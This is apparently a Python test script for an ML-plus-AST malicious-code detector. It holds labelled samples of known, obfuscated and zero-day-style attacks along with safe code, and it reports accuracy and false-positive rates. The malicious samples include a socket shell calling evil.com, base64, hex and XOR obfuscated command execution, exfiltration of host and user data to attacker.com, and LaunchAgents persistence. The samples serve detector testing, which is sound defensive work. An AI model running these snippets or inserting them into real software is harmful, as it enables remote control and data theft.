#!/usr/bin/env python3
"""
Round 24 - 未知变体检测测试

测试 ML 增强对未知变体、混淆代码、0-day 攻击的检测能力
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from round24.integration.ml_classifier import MLClassifier
from round16.ast_detector_v2 import ASTDetectorV2

# 查找模型
models_dir = Path(__file__).parent.parent / 'round24' / 'ml' / 'models'
model_files = list(models_dir.glob('*.pkl'))
if model_files:
    model_path = str(max(model_files, key=lambda p: p.stat().st_mtime))
else:
    print("❌ 未找到模型文件")
    sys.exit(1)

# 初始化
ml_classifier = MLClassifier(model_path)
ast_detector = ASTDetectorV2()

print("=" * 70)
print("🧪 Round 24 - 未知变体检测测试")
print("=" * 70)

# 测试用例设计
test_cases = [
    # === 已知攻击类型 (基线测试) ===
    {
        'name': '已知攻击 - 远程代码执行',
        'code': '''
import os
import socket

s = socket.socket()
s.connect(('evil.com', 4444))
os.system(s.recv(1024).decode())
''',
        'language': 'python',
        'expected': True,
        'category': 'known_attack'
    },
    {
        'name': '已知攻击 - Base64 混淆执行',
        'code': '''
import base64
code = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk="
exec(base64.b64decode(code).decode())
''',
        'language': 'python',
        'expected': True,
        'category': 'known_attack'
    },
    
    # === 未知变体 (测试泛化能力) ===
    {
        'name': '未知变体 - 字符串拼接混淆',
        'code': '''
import os
cmd = "sy" + "st" + "em"
getattr(os, cmd)("whoami")
''',
        'language': 'python',
        'expected': True,
        'category': 'unknown_variant'
    },
    {
        'name': '未知变体 - 动态导入',
        'code': '''
import importlib
os = importlib.import_module('os')
os.system('id')
''',
        'language': 'python',
        'expected': True,
        'category': 'unknown_variant'
    },
    {
        'name': '未知变体 - 反射调用',
        'code': '''
import builtins
import os
exec_func = getattr(builtins, 'exec')
exec_func("import socket; socket.socket()")
''',
        'language': 'python',
        'expected': True,
        'category': 'unknown_variant'
    },
    
    # === 混淆代码 (测试反混淆能力) ===
    {
        'name': '混淆代码 - 多层 Base64',
        'code': '''
import base64
layer1 = "WkdzYkdWdVpHVnM="
layer2 = base64.b64decode(layer1).decode()
payload = base64.b64decode(layer2).decode()
exec(payload)
''',
        'language': 'python',
        'expected': True,
        'category': 'obfuscated'
    },
    {
        'name': '混淆代码 - 十六进制编码',
        'code': '''
import subprocess
cmd = bytes.fromhex('77686f616d69').decode()
subprocess.run(cmd, shell=True)
''',
        'language': 'python',
        'expected': True,
        'category': 'obfuscated'
    },
    {
        'name': '混淆代码 - 字符串异或',
        'code': '''
import os
def decode(s):
    return ''.join(chr(ord(c) ^ 0x20) for c in s)
cmd = decode("SYSTEM")
getattr(os, cmd.lower())("ls")
''',
        'language': 'python',
        'expected': True,
        'category': 'obfuscated'
    },
    
    # === 0-day 攻击 (测试未知威胁) ===
    {
        'name': '0-day - 新型数据外传',
        'code': '''
import urllib.request
import getpass
import socket

hostname = socket.gethostname()
username = getpass.getuser()
data = f"{hostname}:{username}"
urllib.request.urlopen(f"http://attacker.com/collect?data={data}")
''',
        'language': 'python',
        'expected': True,
        'category': 'zero_day'
    },
    {
        'name': '0-day - 隐蔽持久化',
        'code': '''
import os
import shutil

# 复制自身到启动目录
startup = os.path.expanduser("~/Library/LaunchAgents")
shutil.copy(__file__, os.path.join(startup, "com.update.service.plist"))
''',
        'language': 'python',
        'expected': True,
        'category': 'zero_day'
    },
    
    # === 安全样本 (测试误报率) ===
    {
        'name': '安全样本 - 正常文件操作',
        'code': '''
import os
import json

def read_config(path):
    with open(path, 'r') as f:
        return json.load(f)

if __name__ == '__main__':
    config = read_config('config.json')
    print(config)
''',
        'language': 'python',
        'expected': False,
        'category': 'safe'
    },
    {
        'name': '安全样本 - 网络请求',
        'code': '''
import requests

def fetch_weather(city):
    url = f"https://api.weather.com/{city}"
    response = requests.get(url)
    return response.json()

if __name__ == '__main__':
    weather = fetch_weather('Beijing')
    print(weather)
''',
        'language': 'python',
        'expected': False,
        'category': 'safe'
    },
    {
        'name': '安全样本 - 数据处理',
        'code': '''
import pandas as pd
import numpy as np

def analyze_data(df):
    mean = df.mean()
    std = df.std()
    return {'mean': mean, 'std': std}

if __name__ == '__main__':
    data = pd.DataFrame([1, 2, 3, 4, 5])
    result = analyze_data(data)
    print(result)
''',
        'language': 'python',
        'expected': False,
        'category': 'safe'
    },
]

# 执行测试
results = {
    'known_attack': {'total': 0, 'correct': 0},
    'unknown_variant': {'total': 0, 'correct': 0},
    'obfuscated': {'total': 0, 'correct': 0},
    'zero_day': {'total': 0, 'correct': 0},
    'safe': {'total': 0, 'correct': 0},
}

print("\n📋 开始测试...\n")

for i, test in enumerate(test_cases, 1):
    # ML 预测
    ml_pred, ml_conf, _ = ml_classifier.predict(test['code'], test['language'])
    
    # AST 检测
    ast_result = ast_detector.analyze_code(test['code'], f"test_{i}.py")
    
    # 融合决策
    trad_score = 1.0 if ast_result.is_malicious else 0.0
    ml_score = ml_conf if ml_pred else 0.0
    final_score = 0.6 * trad_score + 0.4 * ml_score
    fusion_pred = final_score >= 0.5
    
    # 判断正确性
    ml_correct = ml_pred == test['expected']
    ast_correct = ast_result.is_malicious == test['expected']
    fusion_correct = fusion_pred == test['expected']
    
    # 更新统计
    cat = test['category']
    results[cat]['total'] += 1
    if ml_correct:
        results[cat]['ml_correct'] = results[cat].get('ml_correct', 0) + 1
    if ast_correct:
        results[cat]['ast_correct'] = results[cat].get('ast_correct', 0) + 1
    if fusion_correct:
        results[cat]['fusion_correct'] = results[cat].get('fusion_correct', 0) + 1
    
    # 打印结果
    status_ml = "✅" if ml_correct else "❌"
    status_ast = "✅" if ast_correct else "❌"
    status_fusion = "✅" if fusion_correct else "❌"
    
    print(f"{i}. {test['name']}")
    print(f"   期望：{'恶意' if test['expected'] else '安全'}")
    print(f"   AST:  {'恶意' if ast_result.is_malicious else '安全'} ({ast_result.risk_score}) {status_ast}")
    print(f"   ML:   {'恶意' if ml_pred else '安全'} ({ml_conf:.4f}) {status_ml}")
    print(f"   融合：{'恶意' if fusion_pred else '安全'} ({final_score:.4f}) {status_fusion}")
    print()

# 汇总结果
print("=" * 70)
print("📊 测试结果汇总")
print("=" * 70)

print("\n按类别统计:\n")
print(f"{'类别':<20} {'样本数':<8} {'AST 正确':<10} {'ML 正确':<10} {'融合正确':<10}")
print("-" * 60)

for cat, stats in results.items():
    total = stats['total']
    ast_acc = stats.get('ast_correct', 0) / total * 100 if total > 0 else 0
    ml_acc = stats.get('ml_correct', 0) / total * 100 if total > 0 else 0
    fusion_acc = stats.get('fusion_correct', 0) / total * 100 if total > 0 else 0
    
    cat_name = {
        'known_attack': '已知攻击',
        'unknown_variant': '未知变体',
        'obfuscated': '混淆代码',
        'zero_day': '0-day 攻击',
        'safe': '安全样本',
    }.get(cat, cat)
    
    print(f"{cat_name:<20} {total:<8} {ast_acc:>6.1f}%     {ml_acc:>6.1f}%     {fusion_acc:>6.1f}%")

# 总体统计
total_all = sum(s['total'] for s in results.values())
ast_all = sum(s.get('ast_correct', 0) for s in results.values())
ml_all = sum(s.get('ml_correct', 0) for s in results.values())
fusion_all = sum(s.get('fusion_correct', 0) for s in results.values())

print("-" * 60)
print(f"{'总计':<20} {total_all:<8} {ast_all/total_all*100:>6.1f}%     {ml_all/total_all*100:>6.1f}%     {fusion_all/total_all*100:>6.1f}%")

print("\n" + "=" * 70)

# 关键发现
print("\n💡 关键发现:\n")

# 计算各类别提升
for cat in ['unknown_variant', 'obfuscated', 'zero_day']:
    stats = results[cat]
    ast_acc = stats.get('ast_correct', 0) / stats['total'] * 100 if stats['total'] > 0 else 0
    ml_acc = stats.get('ml_correct', 0) / stats['total'] * 100 if stats['total'] > 0 else 0
    fusion_acc = stats.get('fusion_correct', 0) / stats['total'] * 100 if stats['total'] > 0 else 0
    
    cat_name = {
        'unknown_variant': '未知变体',
        'obfuscated': '混淆代码',
        'zero_day': '0-day 攻击',
    }.get(cat, cat)
    
    ml_improve = ml_acc - ast_acc
    fusion_improve = fusion_acc - ast_acc
    
    if ml_improve > 0:
        print(f"✅ {cat_name}: ML 增强提升 {ml_improve:+.1f}%, 融合提升 {fusion_improve:+.1f}%")
    else:
        print(f"⚠️  {cat_name}: ML 增强 {ml_improve:+.1f}%, 融合 {fusion_improve:+.1f}%")

# 误报率
safe_stats = results['safe']
safe_ast_fp = (safe_stats['total'] - safe_stats.get('ast_correct', 0)) / safe_stats['total'] * 100
safe_ml_fp = (safe_stats['total'] - safe_stats.get('ml_correct', 0)) / safe_stats['total'] * 100
safe_fusion_fp = (safe_stats['total'] - safe_stats.get('fusion_correct', 0)) / safe_stats['total'] * 100

print(f"\n误报率 (安全样本误判为恶意):")
print(f"  AST: {safe_ast_fp:.1f}%")
print(f"  ML:  {safe_ml_fp:.1f}%")
print(f"  融合：{safe_fusion_fp:.1f}%")

print("\n" + "=" * 70)
print("✅ 测试完成!")
print("=" * 70)
